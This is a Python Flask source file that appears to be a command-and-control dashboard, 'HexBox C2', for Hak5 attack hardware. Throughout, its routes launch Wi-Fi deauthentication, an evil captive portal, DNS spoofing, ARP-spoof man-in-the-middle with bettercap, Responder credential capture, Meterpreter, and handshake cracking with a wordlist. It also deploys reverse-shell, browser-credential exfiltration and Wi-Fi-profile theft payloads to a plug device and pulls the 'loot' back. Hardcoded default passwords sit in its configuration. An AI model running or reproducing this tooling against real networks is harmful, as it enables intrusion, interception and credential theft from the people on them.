#!/usr/bin/env python3
# ~/hexbox/c2/hexbox_c2.py
# Central command for all Hak5 gear

from flask import Flask, render_template_string, request, jsonify
import subprocess, paramiko, requests, json, os, signal, threading
from datetime import datetime
from pathlib import Path

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Config — loads from config.json one directory up; falls back to defaults
# ---------------------------------------------------------------------------

def _load_cfg():
    cfg_path = Path(__file__).parent.parent / "config.json"
    if cfg_path.exists():
        with open(cfg_path) as f:
            return json.load(f)
    return {}

_CFG       = _load_cfg()
_HB        = _CFG.get("hexbox", {})
DEVICES    = _CFG.get("devices") or {
    "pineapple":      {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple", "api_port": 1471},
    "sharkjack":      {"ip": "172.16.24.1",  "user": "root", "pass": "hak5shark"},
    "packetsquirrel": {"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
    "lanturtle":      {"ip": "172.16.84.1",  "user": "root", "pass": "hak5turtle"},
    "omgplug":        {"ip": "192.168.1.50", "user": "root", "pass": "hak5omg"},
}

LOOT        = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
LOGS        = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
PORT        = _HB.get("dashboard_port", 1337)
SCAN_TARGET = _HB.get("scan_target",   "192.168.1.0/24")

LOOT.mkdir(parents=True, exist_ok=True)
LOGS.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Process tracking for long-running background tasks (responder, bettercap…)
# ---------------------------------------------------------------------------

_procs:      dict[str, subprocess.Popen] = {}
_procs_lock: threading.Lock              = threading.Lock()


def start_proc(name: str, cmd: str) -> int:
    """Start a named background process, replacing any previous instance."""
    with _procs_lock:
        _stop_proc_locked(name)
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL, start_new_session=True)
        _procs[name] = p
    _log(f"Started {name} pid={p.pid}")
    return p.pid


def _stop_proc_locked(name: str) -> bool:
    p = _procs.pop(name, None)
    if not p:
        return False
    try:
        os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    except Exception:
        try:
            p.terminate()
        except Exception:
            pass
    return True

# ---------------------------------------------------------------------------
# SSH / SFTP helpers
# ---------------------------------------------------------------------------

def ssh_exec(device: str, cmd: str) -> str:
    d = DEVICES[device]
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(d["ip"], username=d["user"], password=d["pass"], timeout=10)
        _, stdout, stderr = client.exec_command(cmd)
        return stdout.read().decode() + stderr.read().decode()
    except Exception as e:
        return f"[ERR] {e}"
    finally:
        client.close()


def sftp_pull(device: str, remote_dir: str, local_dir: Path) -> str:
    """Pull all files from a remote directory via SFTP (no sshpass)."""
    d = DEVICES[device]
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
        sftp = client.open_sftp()
        try:
            entries = sftp.listdir(remote_dir)
        except Exception:
            return f"[ERR] Cannot list {remote_dir}"
        local_dir.mkdir(parents=True, exist_ok=True)
        count = 0
        for name in entries:
            try:
                sftp.get(f"{remote_dir}/{name}", str(local_dir / name))
                count += 1
            except Exception:
                pass
        sftp.close()
        return f"Pulled {count} file(s) to {local_dir}"
    except Exception as e:
        return f"[ERR] {e}"
    finally:
        client.close()


def _log(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOGS / "c2.log", "a") as f:
            f.write(f"[{ts}] {msg}\n")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Dashboard HTML
# ---------------------------------------------------------------------------

DASH = """<!DOCTYPE html>
<html><head><title>HexBox C2</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:16px;margin:0}
h1{margin:0 0 3px;font-size:1.35em}
.ts{color:#555;font-size:.78em;margin-bottom:12px}
button{background:#111;color:#0f0;border:1px solid #0f0;padding:6px 10px;margin:2px;
       cursor:pointer;font-family:monospace;font-size:.8em;transition:background .1s}
button:hover{background:#0f0;color:#000}
button.kill{border-color:#c00;color:#c00}
button.kill:hover{background:#c00;color:#fff}
pre{background:#000;border:1px solid #0f0;padding:10px;max-height:300px;overflow:auto;
    font-size:.8em;white-space:pre-wrap;word-break:break-all;margin:0}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:10px}
.card{border:1px solid #1a1a1a;padding:10px}
.card h2{color:#c00;margin:0 0 7px;font-size:.9em;display:flex;
         justify-content:space-between;align-items:center}
.dot{width:8px;height:8px;border-radius:50%;display:inline-block;
     background:#333;flex-shrink:0;cursor:help}
.dot.up{background:#0f0}.dot.dn{background:#c00}.dot.chk{background:#ff0}
.row{border:1px solid #1a1a1a;padding:8px;margin-bottom:8px;display:flex;
     align-items:center;gap:8px;flex-wrap:wrap}
.row label{color:#555;font-size:.8em;white-space:nowrap}
.row input{background:#111;color:#0f0;border:1px solid #333;padding:4px 6px;
           font-family:monospace;font-size:.8em;min-width:180px;flex:1}
.bar{border:1px solid #1a1a1a;padding:8px;margin-bottom:8px}
.bar h3{margin:0 0 6px;color:#ff0;font-size:.85em}
#procs{font-size:.8em;color:#888}
.sec{color:#c00;margin:8px 0 5px;font-size:.9em}
</style></head><body>

<h1>&#x1F5A5; HexBox C2</h1>
<div class="ts" id="ts">{{ts}}</div>

<div class="row">
  <label>Target Network:</label>
  <input id="tgt" value="{{target}}" placeholder="192.168.1.0/24">
  <button onclick="checkStatus()">&#x25CF; Ping Devices</button>
  <button onclick="refreshProcs()">&#x21BA; Refresh Procs</button>
</div>

<div class="grid">

<div class="card"><h2>WiFi Pineapple<span class="dot" id="dot-pineapple" title="unknown"></span></h2>
  <button onclick="run('/pineapple/recon')">Recon Scan</button>
  <button onclick="run('/pineapple/deauth')">Deauth All</button>
  <button onclick="run('/pineapple/evil_portal')">Evil Portal</button>
  <button onclick="run('/pineapple/handshakes')">Pull Handshakes</button>
</div>

<div class="card"><h2>Shark Jack<span class="dot" id="dot-sharkjack" title="unknown"></span></h2>
  <button onclick="run('/shark/nmap')">Nmap Sweep</button>
  <button onclick="run('/shark/loot')">Pull Loot</button>
</div>

<div class="card"><h2>Packet Squirrel<span class="dot" id="dot-packetsquirrel" title="unknown"></span></h2>
  <button onclick="run('/squirrel/pcap')">Start PCAP</button>
  <button onclick="run('/squirrel/dnsspoof')">DNS Spoof</button>
  <button onclick="run('/squirrel/pull')">Pull PCAPs</button>
</div>

<div class="card"><h2>LAN Turtle<span class="dot" id="dot-lanturtle" title="unknown"></span></h2>
  <button onclick="run('/turtle/autossh')">AutoSSH Tunnel</button>
  <button onclick="run('/turtle/responder')">Responder</button>
  <button onclick="run('/turtle/meterpreter')">Meterpreter</button>
</div>

<div class="card"><h2>OMG Plug<span class="dot" id="dot-omgplug" title="unknown"></span></h2>
  <button onclick="run('/omg/payload/reverse')">Reverse Shell</button>
  <button onclick="run('/omg/payload/exfil')">Exfil Browser Creds</button>
  <button onclick="run('/omg/payload/wifi')">Steal WiFi Profiles</button>
</div>

<div class="card"><h2>Pi Local</h2>
  <button onclick="run('/pi/scan')">Nmap Scan</button><br>
  <button onclick="run('/pi/responder')">Start Responder</button>
  <button onclick="stopProc('responder')" class="kill">Stop</button><br>
  <button onclick="run('/pi/bettercap')">Bettercap MITM</button>
  <button onclick="stopProc('bettercap')" class="kill">Stop</button><br>
  <button onclick="run('/pi/handshake_crack')">Crack Handshakes</button>
  <button onclick="stopProc('crack')" class="kill">Stop</button>
</div>

</div><!-- /grid -->

<div class="bar">
  <h3>Background Processes</h3>
  <div id="procs">—</div>
</div>

<h2 class="sec">Output</h2>
<pre id="out">Awaiting orders...</pre>

<script>
const out=document.getElementById('out'),ts=document.getElementById('ts');
setInterval(()=>{ts.textContent=new Date().toLocaleString();},1000);

async function run(path){
  out.textContent='[*] '+path+'...';
  try{
    const r=await fetch(path,{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({target:document.getElementById('tgt').value})});
    const j=await r.json();
    out.textContent=j.output||j.error||'(no output)';
    refreshProcs();
  }catch(e){out.textContent='[ERR] '+e;}
}

async function stopProc(name){
  out.textContent='[*] Stopping '+name+'...';
  try{
    const r=await fetch('/stop/'+name,{method:'POST'});
    out.textContent=(await r.json()).output;
    refreshProcs();
  }catch(e){out.textContent='[ERR] '+e;}
}

async function checkStatus(){
  document.querySelectorAll('.dot').forEach(d=>{d.className='dot chk';d.title='checking...';});
  try{
    const j=await(await fetch('/status')).json();
    for(const[dev,info] of Object.entries(j)){
      const d=document.getElementById('dot-'+dev);
      if(d){d.className='dot '+(info.up?'up':'dn');
            d.title=(info.up?'reachable':'unreachable')+': '+info.ip;}
    }
  }catch(_){}
}

async function refreshProcs(){
  try{
    const j=await(await fetch('/processes')).json();
    const div=document.getElementById('procs');
    if(!j.processes?.length){div.textContent='None';return;}
    div.innerHTML=j.processes.map(p=>
      `<span style="color:#0f0">[${p.pid}]</span> ${p.name}&nbsp;`+
      `<button class="kill" style="padding:1px 5px" onclick="stopProc('${p.name}')">kill</button>`
    ).join('&nbsp; ');
  }catch(_){}
}

checkStatus();
refreshProcs();
setInterval(refreshProcs,15000);
</script>
</body></html>"""

# ---------------------------------------------------------------------------
# Routes — utility
# ---------------------------------------------------------------------------

@app.route("/")
def dash():
    return render_template_string(DASH,
                                  ts=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                  target=SCAN_TARGET)


@app.route("/status")
def status():
    import socket
    result = {}
    for dev, info in DEVICES.items():
        ip, up = info["ip"], False
        for port in (22, 80, info.get("api_port", 0)):
            if not port:
                continue
            try:
                s = socket.create_connection((ip, port), timeout=2)
                s.close()
                up = True
                break
            except Exception:
                pass
        result[dev] = {"ip": ip, "up": up}
    return jsonify(result)


@app.route("/processes")
def list_procs():
    with _procs_lock:
        procs = [{"name": k, "pid": v.pid}
                 for k, v in _procs.items() if v.poll() is None]
    return jsonify(processes=procs)


@app.route("/stop/<name>", methods=["POST"])
def stop_named(name: str):
    with _procs_lock:
        killed = _stop_proc_locked(name)
    msg = f"Stopped {name}" if killed else f"{name} was not running"
    _log(msg)
    return jsonify(output=msg)

# ---------------------------------------------------------------------------
# Pineapple
# ---------------------------------------------------------------------------

@app.route("/pineapple/recon", methods=["POST"])
def p_recon():
    out = ssh_exec("pineapple", "iw dev wlan1mon scan 2>&1 | head -100")
    _log(f"Pineapple recon: {len(out)} bytes")
    return jsonify(output=out)


@app.route("/pineapple/deauth", methods=["POST"])
def p_deauth():
    out = ssh_exec("pineapple",
        "aireplay-ng --deauth 10 -a "
        "$(iw dev wlan1mon scan | grep BSS | head -1 | awk '{print $2}') wlan1mon")
    _log("Pineapple deauth")
    return jsonify(output=out)


@app.route("/pineapple/evil_portal", methods=["POST"])
def p_portal():
    out = ssh_exec("pineapple", "/etc/init.d/evilportal start && evilportal start")
    _log("Evil Portal started")
    return jsonify(output=out)


@app.route("/pineapple/handshakes", methods=["POST"])
def p_hand():
    out = sftp_pull("pineapple", "/root/handshakes", LOOT / "handshakes")
    _log(f"Handshakes: {out}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Shark Jack
# ---------------------------------------------------------------------------

@app.route("/shark/nmap", methods=["POST"])
def s_nmap():
    out = ssh_exec("sharkjack",
        "nmap -sS -sV -O -T4 $(ip route | grep default | awk '{print $3}')/24")
    _log("Shark nmap")
    return jsonify(output=out)


@app.route("/shark/loot", methods=["POST"])
def s_loot():
    out = sftp_pull("sharkjack", "/root/loot", LOOT / "shark")
    _log(f"Shark loot: {out}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Packet Squirrel
# ---------------------------------------------------------------------------

@app.route("/squirrel/pcap", methods=["POST"])
def sq_pcap():
    out = ssh_exec("packetsquirrel",
                   "tcpdump -i br-lan -w /mnt/loot/capture_$(date +%s).pcap &")
    _log("Squirrel PCAP started")
    return jsonify(output=out or "PCAP capture started in background")


@app.route("/squirrel/dnsspoof", methods=["POST"])
def sq_dns():
    out = ssh_exec("packetsquirrel", "dnsspoof -i br-lan -f /root/hosts.txt &")
    _log("Squirrel DNS spoof started")
    return jsonify(output=out or "DNS spoof started in background")


@app.route("/squirrel/pull", methods=["POST"])
def sq_pull():
    out = sftp_pull("packetsquirrel", "/mnt/loot", LOOT / "pcaps")
    _log(f"Squirrel pull: {out}")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# LAN Turtle
# ---------------------------------------------------------------------------

@app.route("/turtle/autossh", methods=["POST"])
def t_ssh():
    out = ssh_exec("lanturtle",
                   "turtle module enable autossh && turtle module start autossh")
    _log("Turtle autossh")
    return jsonify(output=out)


@app.route("/turtle/responder", methods=["POST"])
def t_resp():
    out = ssh_exec("lanturtle",
                   "turtle module enable responder && turtle module start responder")
    _log("Turtle responder")
    return jsonify(output=out)


@app.route("/turtle/meterpreter", methods=["POST"])
def t_met():
    out = ssh_exec("lanturtle",
                   "turtle module enable meterpreter && turtle module start meterpreter")
    _log("Turtle meterpreter")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# OMG Plug
# ---------------------------------------------------------------------------

def _omg_deploy(payload_file: str) -> str:
    path = Path(payload_file)
    if not path.exists():
        return f"[ERR] Payload not found: {payload_file}"
    url = f"http://{DEVICES['omgplug']['ip']}/api/payload"
    try:
        r = requests.post(url, json={"payload": path.read_text()}, timeout=10)
        return r.text or "Deployed"
    except Exception as e:
        return f"[ERR] {e}"


@app.route("/omg/payload/reverse", methods=["POST"])
def omg_rev():
    out = _omg_deploy(os.path.expanduser("~/hexbox/payloads/reverse_shell.ducky"))
    _log("OMG reverse shell deployed")
    return jsonify(output=out)


@app.route("/omg/payload/exfil", methods=["POST"])
def omg_exfil():
    out = _omg_deploy(os.path.expanduser("~/hexbox/payloads/browser_exfil.ducky"))
    _log("OMG exfil deployed")
    return jsonify(output=out)


@app.route("/omg/payload/wifi", methods=["POST"])
def omg_wifi():
    out = _omg_deploy(os.path.expanduser("~/hexbox/payloads/wifi_steal.ducky"))
    _log("OMG wifi steal deployed")
    return jsonify(output=out)

# ---------------------------------------------------------------------------
# Pi local
# ---------------------------------------------------------------------------

@app.route("/pi/scan", methods=["POST"])
def pi_scan():
    data   = request.get_json(silent=True) or {}
    target = data.get("target", SCAN_TARGET)
    result = subprocess.run(["nmap", "-sS", "-T4", target],
                            capture_output=True, text=True, timeout=300)
    out    = result.stdout + result.stderr
    _log(f"Pi nmap → {target}")
    return jsonify(output=out)


@app.route("/pi/responder", methods=["POST"])
def pi_resp():
    pid = start_proc("responder",
                     f"responder -I eth0 -wrf >> {LOGS}/responder.log 2>&1")
    return jsonify(output=f"Responder started (pid={pid}) — logs/responder.log")


@app.route("/pi/bettercap", methods=["POST"])
def pi_bc():
    pid = start_proc("bettercap",
                     "bettercap -iface wlan0 -eval "
                     "'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'")
    return jsonify(output=f"Bettercap MITM started (pid={pid})")


@app.route("/pi/handshake_crack", methods=["POST"])
def pi_crack():
    pid = start_proc("crack",
                     f"for h in {LOOT}/handshakes/*.cap; do "
                     f"aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$h\" "
                     f">> {LOGS}/crack.log; done")
    return jsonify(output=f"Cracking started (pid={pid}) — logs/crack.log")


if __name__ == "__main__":
    print(f"[+] HexBox C2 online → http://0.0.0.0:{PORT}")
    app.run(host="0.0.0.0", port=PORT, debug=False)
